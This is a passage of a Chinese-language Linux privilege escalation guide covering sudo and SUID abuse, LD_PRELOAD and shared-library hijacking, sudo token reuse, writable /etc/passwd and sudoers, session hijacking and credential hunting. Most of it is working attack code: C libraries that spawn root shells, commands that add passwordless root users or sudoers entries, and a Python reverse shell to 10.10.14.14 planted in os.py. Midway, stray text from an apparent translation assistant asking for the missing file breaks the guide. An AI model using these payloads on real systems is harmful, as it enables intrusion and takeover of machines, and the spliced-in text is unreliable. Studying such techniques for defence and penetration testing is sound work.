如果你不介意产生大量噪音，并且目标主机上存在 `su` 和 `timeout` 二进制文件，你可以尝试使用 [su-bruteforce](https://github.com/carlospolop/su-bruteforce)。\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) 使用 `-a` 参数也会尝试对用户进行 brute-force。

## 可写 $PATH 滥用

### $PATH

如果你发现你可以**写入 $PATH 中某个文件夹**，你可能能够通过**在该可写文件夹中创建一个 backdoor**来提升权限，backdoor 的名称应为将由其他用户（最好是 root）执行的某个命令，并且该命令**不是从 $PATH 中位于你可写文件夹之前的文件夹加载的**。

### SUDO and SUID

你可能被允许使用 sudo 执行某些命令，或者某些命令可能设置了 suid 位。使用以下命令检查：
```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```
一些 **意想不到的命令允许你读取和/或写入文件，甚至执行命令。** 例如：
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```
### NOPASSWD

Sudo 配置可能允许用户在不知道密码的情况下以另一个用户的权限执行某个命令。
```
$ sudo -l
User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
```
在这个示例中，用户 `demo` 可以以 `root` 身份运行 `vim`，现在通过将 ssh key 添加到 `root` 目录或调用 `sh` 来获得 shell 变得非常容易。
```
sudo vim -c '!sh'
```
### SETENV

此指令允许用户在执行某些操作时**设置环境变量**：
```bash
$ sudo -l
User waldo may run the following commands on admirer:
(ALL) SETENV: /opt/scripts/admin_tasks.sh
```
这个示例，**based on HTB machine Admirer**，**易受攻击** 于 **PYTHONPATH hijacking**，可在以 root 身份执行脚本时加载任意 python 库：
```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```
### BASH_ENV preserved via sudo env_keep → root shell

If sudoers preserves `BASH_ENV` (e.g., `Defaults env_keep+="ENV BASH_ENV"`), you can leverage Bash’s non-interactive startup behavior to run arbitrary code as root when invoking an allowed command.

- 为什么可行：对于非交互式 shell，Bash 会评估 `$BASH_ENV` 并在运行目标脚本之前载入并执行该文件。许多 sudo 规则允许运行脚本或 shell 包装器。如果 sudo 保留了 `BASH_ENV`，你的文件会以 root 权限被载入执行。

- Requirements:
- 一个你可以运行的 sudo 规则（任何非交互式调用 `/bin/bash` 的目标，或任何 bash 脚本）。
- `BASH_ENV` 存在于 `env_keep` 中（可用 `sudo -l` 检查）。

- PoC:
```bash
cat > /dev/shm/shell.sh <<'EOF'
#!/bin/bash
/bin/bash
EOF
chmod +x /dev/shm/shell.sh
BASH_ENV=/dev/shm/shell.sh sudo /usr/bin/systeminfo   # or any permitted script/binary that triggers bash
# You should now have a root shell
```
- 加固：
- 将 `BASH_ENV`（和 `ENV`）从 `env_keep` 中移除，优先使用 `env_reset`。
- 避免为 sudo-allowed 的命令使用 shell wrappers；使用最小化的 binaries。
- 当使用被保留的 env vars 时，考虑对 sudo I/O 进行日志记录和告警。

### Sudo 执行绕过路径

**跳转** 去读取其它文件或使用 **symlinks**。例如在 sudoers 文件中： _hacker10 ALL= (root) /bin/less /var/log/\*_
```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```
如果使用 **wildcard** (\*), 就更容易了:
```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```
**缓解措施**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Sudo 命令/SUID 二进制 未指定命令路径

如果将 **sudo permission** 授予单个命令且 **without specifying the path**：_hacker10 ALL= (root) less_，你可以通过更改 PATH 变量来利用它。
```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```
此技术也可用于如果一个 **suid** 二进制文件 **执行另一个命令且未指定其路径（始终使用** _**strings**_ **检查不寻常的 SUID 二进制文件的内容）**。

[Payload examples to execute.](payloads-to-execute.md)

### 带命令路径的 SUID binary

如果 **suid** 二进制文件 **执行另一个命令并指定了路径**，那么你可以尝试 **export a function**，其名称与 suid 文件调用的命令相同。

例如，如果一个 suid 二进制文件调用 _**/usr/sbin/service apache2 start**_，你必须尝试创建该函数并将其 export：
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```
然后，当你调用 suid 二进制文件时，这个函数将被执行

### LD_PRELOAD & **LD_LIBRARY_PATH**

**LD_PRELOAD** 环境变量用于指定一个或多个共享库（.so 文件），由加载器在其他库之前加载，包括标准 C 库（`libc.so`）。这个过程称为预加载库。

然而，为了维护系统安全并防止该功能被滥用，特别是在 **suid/sgid** 可执行文件中，系统强制执行某些条件：

- 当可执行文件的真实用户 ID (_ruid_) 与有效用户 ID (_euid_) 不匹配时，加载器会忽略 **LD_PRELOAD**。
- 对于具有 suid/sgid 的可执行文件，只有位于标准路径且同样具有 suid/sgid 的库会被预加载。

如果你能够使用 `sudo` 执行命令，且 `sudo -l` 的输出包含语句 **env_keep+=LD_PRELOAD**，则可能发生权限提升。该配置允许 **LD_PRELOAD** 环境变量在以 `sudo` 运行命令时得以保留并被识别，可能导致以提升的权限执行任意代码。
```
Defaults        env_keep += LD_PRELOAD
```
保存为 **/tmp/pe.c**
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
然后使用以下命令**编译它**：
```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
最后，运行 **escalate privileges**
```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```
> [!CAUTION]
> 如果攻击者控制了 **LD_LIBRARY_PATH** 环境变量，就可以滥用类似的 privesc，因为他控制了库被搜索的路径。
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```
### SUID Binary – .so injection

当遇到具有 **SUID** 权限且看起来异常的二进制文件时，最好检查它是否正确加载 **.so** 文件。可以通过运行以下命令来检查：
```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```
例如，遇到类似错误 _"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"_ 表明可能存在可利用的漏洞。

要利用它，可以创建一个 C 文件，例如 _"/path/to/.config/libcalc.c"_，并写入以下代码：
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
这段代码在编译并执行后，旨在通过操作文件权限并执行具有提升权限的 shell 来提升权限。

使用如下命令将上述 C 文件编译为 shared object (.so) 文件：
```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```
最后，运行受影响的 SUID 二进制文件应该会触发 exploit，从而可能导致 system compromise。

## Shared Object Hijacking
```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
既然我们已经发现了一个会从我们可以写入的文件夹加载库的 SUID 二进制文件，下面就在该文件夹中创建具有必要名称的库：
```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
setresuid(0,0,0);
system("/bin/bash -p");
}
```
如果你遇到如下错误：
```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```
这意味着你生成的库需要包含一个名为 `a_function_name` 的函数。

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) 是一个精心整理的 Unix 二进制文件列表，攻击者可以利用其中的条目绕过本地安全限制。 [**GTFOArgs**](https://gtfoargs.github.io/) 与之类似，但适用于只能在命令中**注入参数**的情况。

该项目收集了 Unix 二进制文件的合法功能，这些功能可能被滥用来逃离受限 shell、提权或维持已提升的权限、传输文件、生成 bind 和 reverse shells，并促进其他 post-exploitation 任务。

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'


{{#ref}}
https://gtfobins.github.io/
{{#endref}}


{{#ref}}
https://gtfoargs.github.io/
{{#endref}}

### FallOfSudo

如果你可以运行 `sudo -l`，可以使用工具 [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) 来检测是否存在可被利用的 sudo 规则。

### Reusing Sudo Tokens

在你拥有 **sudo access** 但不知道密码的情况下，你可以通过**等待 sudo 命令被执行然后劫持会话 token**来提权。

Requirements to escalate privileges:

- 你已经以用户 "_sampleuser_" 拥有一个 shell
- "_sampleuser_" 在最近 **15 分钟** 内**使用过 `sudo`** 来执行某些操作（默认情况下，这是 sudo token 的持续时间，允许我们在不输入密码的情况下使用 `sudo`）
- `cat /proc/sys/kernel/yama/ptrace_scope` 的输出为 0
- `gdb` 可用（你可以上传它）

（你可以临时启用 `ptrace_scope`：`echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope`，或通过修改 `/etc/sysctl.d/10-ptrace.conf` 并设置 `kernel.yama.ptrace_scope = 0` 来永久启用）

如果满足上述条件，**你可以使用以下工具提权：** [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)

- 第一个 **exploit** (`exploit.sh`) 会在 _/tmp_ 下创建二进制文件 `activate_sudo_token`。你可以用它来**在你的会话中激活 sudo token**（它不会自动给你一个 root shell，运行 `sudo su`）：
```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```
- The **second exploit** (`exploit_v2.sh`) 将在 _/tmp_ 创建一个 sh shell，**由 root 拥有并带有 setuid**
```bash
bash exploit_v2.sh
/tmp/sh -p
```
- **第三个 exploit** (`exploit_v3.sh`) 将 **创建 sudoers file**，使 **sudo tokens 永久有效并允许所有用户使用 sudo**
```bash
bash exploit_v3.sh
sudo su
```
### /var/run/sudo/ts/\<Username>

如果你对该目录或目录内任意已创建文件拥有 **写权限**，可以使用二进制文件 [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools) 来 **为某个用户和 PID 创建 sudo token**。\
例如，如果你可以覆盖文件 _/var/run/sudo/ts/sampleuser_，并且以该用户身份拥有一个 PID 为 1234 的 shell，你可以在不需要知道密码的情况下通过以下操作**获取 sudo 权限**：
```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```
### /etc/sudoers, /etc/sudoers.d

文件 `/etc/sudoers` 和 `/etc/sudoers.d` 中的文件配置谁可以使用 `sudo` 以及如何使用。 这些文件 **默认情况下只能被用户 root 和组 root 读取**。\
**如果** 你能**读取**此文件，你可能能够**获得一些有用的信息**，而如果你能**写入**任何文件，你将能够**escalate privileges**。
```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```
如果你能写入，你就能滥用此权限
```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```
滥用这些权限的另一种方法：
```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```
### DOAS

有一些可以替代 `sudo` 二进制文件的工具，例如 OpenBSD 上的 `doas`，记得检查其配置文件 `/etc/doas.conf`。
```
permit nopass demo as root cmd vim
```
### Sudo Hijacking

如果你知道一个用户通常会连接到这台机器并使用 `sudo` 提权，并且你已经在该用户上下文获得了一个 shell，你可以创建一个新的 sudo 可执行文件，该文件会以 root 身份执行你的代码，然后再执行用户的命令。然后，修改该用户上下文的 $PATH（例如在 .bash_profile 中添加新的路径），这样当用户执行 sudo 时，就会运行你的 sudo 可执行文件。

注意，如果用户使用不同的 shell（不是 bash），你需要修改其它文件来添加新的路径。例如[ sudo-piggyback](https://github.com/APTy/sudo-piggyback) 修改了 `~/.bashrc`, `~/.zshrc`, `~/.bash_profile`。你可以在 [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py) 中找到另一个示例。

或者运行类似：
```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```
## 共享库

### ld.so

文件 `/etc/ld.so.conf` 指示 **加载的配置文件来自何处**。通常，此文件包含以下路径：`include /etc/ld.so.conf.d/*.conf`

这意味着会读取来自 `/etc/ld.so.conf.d/*.conf` 的配置文件。 这些配置文件 **指向其他文件夹**，将在这些文件夹中 **搜索** **库**。例如，`/etc/ld.so.conf.d/libc.conf` 的内容是 `/usr/local/lib`。**这意味着系统会在 `/usr/local/lib` 中搜索库**。

如果由于某种原因 **某个用户具有写权限** 于任一指示的路径：`/etc/ld.so.conf`、`/etc/ld.so.conf.d/`、`/etc/ld.so.conf.d/` 内的任何文件或 `/etc/ld.so.conf.d/*.conf` 中配置文件所指向的任何文件夹，他可能能够 escalate privileges.\
请查看以下页面，了解 **how to exploit this misconfiguration**：

{{#ref}}
ld.so.conf-example.md
{{#endref}}

### RPATH
```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x0068c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
```
通过将 lib 复制到 `/var/tmp/flag15/`，它将会在程序的该位置被使用（如 `RPATH` 变量所指定）。
```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x005b0000)
libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x00737000)
```
然后在 `/var/tmp` 使用 `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6` 创建一个恶意库。
```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
char *file = SHELL;
char *argv[] = {SHELL,0};
setresuid(geteuid(),geteuid(), geteuid());
execve(file,argv,0);
}
```
## 能力

Linux capabilities 为进程提供了一个 **可用的 root 权限子集**。这实际上将 root **权限拆分为更小且独立的单元**。每个单元都可以被独立地授予给进程。这样减少了完整权限集，从而降低了被利用的风险。\
阅读以下页面以 **了解更多关于 capabilities 及如何滥用它们**：

{{#ref}}
linux-capabilities.md
{{#endref}}

## 目录权限

在目录中，**表示 "execute" 的位** 意味着受影响的用户可以 **"cd"** 进入该文件夹。\
**"read"** 位表示用户可以 **list** **files**，而 **"write"** 位表示用户可以 **delete** 并 **create** 新的 **files**。

## ACLs

访问控制列表 (ACLs) 表示一种次级的自主权限层，能够 **覆盖传统的 ugo/rwx 权限**。这些权限通过允许或拒绝对非所有者或非组成员的特定用户的访问权来增强对文件或目录访问的控制。此级别的 **粒度确保更精确的访问管理**。更多细节请见 [**here**](https://linuxconfig.org/how-to-manage-acls-on-linux)。

**给** 用户 "kali" 授予 read 和 write 权限（对某个文件）：
```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```
**获取** 系统中具有特定 ACL 的文件：
```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```
## 打开 shell 会话

在 **旧版本** 中，你可能能够 **hijack** 某个不同用户的 **shell** 会话（**root**）。\
在 **最新版本** 中，你只能 **connect** 到只属于 **你自己的用户** 的 screen 会话。然而，你可能会在会话内部发现 **有趣的信息**。

### screen sessions hijacking

**列出 screen 会话**
```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions
```
![](<../../images/image (141).png>)

**附加到会话**
```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```
## tmux sessions hijacking

这是 **旧的 tmux 版本** 的一个问题。作为非特权用户，我无法 hijack 由 root 创建的 tmux (v2.1) session。

**列出 tmux sessions**
```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```
![](<../../images/image (837).png>)

**附加到会话**
```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```
查看 **Valentine box from HTB** 作为示例。

## SSH

### Debian OpenSSL Predictable PRNG - CVE-2008-0166

在 2006 年 9 月到 2008 年 5 月 13 日之间，在基于 Debian 的系统（Ubuntu、Kubuntu 等）上生成的所有 SSL 和 SSH 密钥都可能受到此漏洞影响。\
该漏洞在这些操作系统上创建新的 ssh 密钥时发生，原因是 **只有 32,768 种变体**。这意味着可以计算出所有可能性，**拥有 ssh 公钥即可搜索对应的私钥**。你可以在这里找到预计算的可能性：[https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

### SSH Interesting configuration values

- **PasswordAuthentication:** 指定是否允许 password authentication。默认是 `no`。
- **PubkeyAuthentication:** 指定是否允许 public key authentication。默认是 `yes`。
- **PermitEmptyPasswords**: 当允许 password authentication 时，指定服务器是否允许登录空密码账户。默认是 `no`。

### PermitRootLogin

指定是否允许 root 使用 ssh 登录，默认是 `no`。可选值：

- `yes`: root 可以使用 password 和 private key 登录
- `without-password` or `prohibit-password`: root 只能使用 private key 登录
- `forced-commands-only`: root 仅能使用 private key 登录，且必须指定命令选项
- `no` : 不允许

### AuthorizedKeysFile

指定包含可用于 user authentication 的 public keys 的文件。它可以包含像 `%h` 这样的标记，`%h` 会被替换为 home 目录。**你可以指定绝对路径**（以 `/` 开头）或 **相对于用户 home 的相对路径**。例如:
```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```
该配置表示，如果你尝试使用用户 "**testusername**" 的 **private** key 登录，ssh 会把你的 key 的 public key 与位于 `/home/testusername/.ssh/authorized_keys` 和 `/home/testusername/access` 中的条目进行比较。

### ForwardAgent/AllowAgentForwarding

SSH agent forwarding 允许你 **use your local SSH keys instead of leaving keys**（不要把没有 passphrases 的 keys 放在服务器上！）。因此，你可以通过 ssh **跳转** 到一个 **host**，然后从那里 **跳转到另一个** host，**使用** 位于你 **初始 host** 上的 **key**。

你需要在 `$HOME/.ssh.config` 中设置此选项，如下：
```
Host example.com
ForwardAgent yes
```
请注意，如果 `Host` 为 `*`，每次用户跳转到不同的主机时，该主机都可以访问密钥（这是一个安全问题）。

文件 `/etc/ssh_config` 可以 **覆盖** 这些 **选项** 并允许或拒绝该配置。\
文件 `/etc/sshd_config` 可以使用关键字 `AllowAgentForwarding` **允许** 或 **拒绝** ssh-agent forwarding（默认是允许）。

如果你发现环境中配置了 Forward Agent，请阅读以下页面，因为 **你可能能够滥用它来提升权限**：

{{#ref}}
ssh-forward-agent-exploitation.md
{{#endref}}

## 有趣的文件

### 配置文件

文件 `/etc/profile` 以及 `/etc/profile.d/` 下的文件是 **在用户启动新的 shell 时执行的脚本**。因此，如果你能 **写入或修改其中任意一个，你就能提升权限**。
```bash
ls -l /etc/profile /etc/profile.d/
```
如果发现任何异常的 profile 脚本，你应该检查其中是否有 **敏感信息**。

### Passwd/Shadow Files

根据操作系统的不同，`/etc/passwd` 和 `/etc/shadow` 文件可能使用不同的名称，或者可能存在备份。因此建议 **找到所有这些文件** 并 **检查是否可以读取** 它们，以查看文件中 **是否包含哈希**：
```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```
在某些情况下，你可以在 `/etc/passwd`（或等效文件）中找到 **password hashes**
```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```
### 可写的 /etc/passwd

首先，使用下面的其中一个命令生成一个密码。
```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```
我没有收到 src/linux-hardening/privilege-escalation/README.md 的内容。请把该文件的内容粘贴过来，我会把其中的英文翻译成中文并保持原有的 markdown/HTML 语法不变（代码、路径、标签等不翻译）。

关于“然后添加用户 `hacker` 并添加生成的密码”：
- 我可以为你生成一个安全密码（例如 16 字符，包含大小写字母、数字和符号），并把该密码以明文形式插入到翻译后的 README 中（例如作为代码块或示例命令）。
- 我不会在任何系统上实际创建用户——只会在文件内容中添加相应说明或命令行示例（例如 useradd/chpasswd 命令）。

请确认：
1) 把 README 内容贴上来；
2) 希望我生成多长的密码（默认 16），以及是否要把用户创建命令也一并加上（默认会加入示例命令）。

收到内容和确认后我就开始翻译并插入用户和密码。
```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```
例如: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

现在你可以使用 `su` 命令并使用 `hacker:hacker`

或者，你可以使用下面的命令行添加一个无密码的虚拟用户。\
警告：这可能会降低机器当前的安全性。
```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```
注意：在 BSD 平台上 `/etc/passwd` 位于 `/etc/pwd.db` 和 `/etc/master.passwd`，同时 `/etc/shadow` 被重命名为 `/etc/spwd.db`。

你应该检查是否可以**写入一些敏感文件**。例如，你能否写入某个**服务配置文件**？
```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```
例如，如果机器正在运行 **tomcat** 服务器，并且你可以 **修改位于 /etc/systemd/ 中的 Tomcat 服务配置文件，** 那么你可以修改以下几行：
```
ExecStart=/path/to/backdoor
User=root
Group=root
```
你的 backdoor 将在下次 tomcat 启动时被执行。

### 检查文件夹

以下文件夹可能包含备份或有趣的信息: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (你可能无法读取最后一个但可以尝试)
```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```
### 奇怪的位置/Owned files
```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
do printf "  Group $g:\n";
find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
done
done
```
### 最近几分钟修改的文件
```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```
### Sqlite DB 文件
```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```
### \*\_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml 文件
```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```
### 隐藏文件
```bash
find / -type f -iname ".*" -ls 2>/dev/null
```
### **PATH 中的脚本/二进制文件**
```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```
### **Web 文件**
```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```
### **备份**
```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```
### 已知可能包含密码的文件

查看 [**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS) 的代码，它会搜索 **多个可能包含密码的文件**。\
**另一个有趣的工具** 是: [**LaZagne**](https://github.com/AlessandroZ/LaZagne)，这是一个开源应用，用于检索存储在本地计算机上的大量密码，适用于 Windows、Linux & Mac。

### 日志

如果你能读取日志，你可能会在其中找到 **有趣/机密的信息**。日志越奇怪，可能越有趣（可能）。\
此外，一些 "**不当**" 配置（被后门化？）的 **审计日志** 可能允许你在审计日志中 **记录密码**，如这篇文章所述： [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).
```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```
为了能够读取日志，组 [**adm**](interesting-groups-linux-pe/index.html#adm-group) 将非常有帮助。

### Shell 文件
```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```
### Generic Creds Search/Regex

你还应该检查文件名或内容中包含词 **password** 的文件，也要检查日志中的 IPs 和 emails，或 hashes regexps.\
我不会在这里列出如何完成所有这些检查，但如果你有兴趣可以查看 [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh) 执行的最后几项检查。

## 可写文件

### Python library hijacking

如果你知道一个 python 脚本会从 **哪里** 被执行，且你 **可以在该文件夹写入**，或者你可以 **modify python libraries**，你就可以修改 OS 库并 backdoor it（如果你可以在 python 脚本将被执行的位置写入，复制并粘贴 os.py 库）。

要 **backdoor the library**，只需在 os.py 库的末尾添加以下一行（更改 IP 和 PORT）：
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
### Logrotate 利用

`logrotate` 中的一个漏洞允许对日志文件或其父目录具有 **写权限** 的用户潜在获取提权。原因是 `logrotate` 通常以 **root** 身份运行，可能被操纵去执行任意文件，尤其是在像 _**/etc/bash_completion.d/**_ 这样的目录中。重要的是不仅检查 _/var/log_ 的权限，还要检查任何应用日志轮转的目录的权限。

> [!TIP]
> 此漏洞影响 `logrotate` 版本 `3.18.0` 及更早版本

关于该漏洞的更详细信息请参见此页面： [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition)。

你可以使用 [**logrotten**](https://github.com/whotwagner/logrotten) 利用此漏洞。

该漏洞与 [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(nginx logs)** 非常相似，因此每当你发现可以修改日志时，检查谁在管理这些日志，并检查是否可以通过将日志替换为符号链接来提权。

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

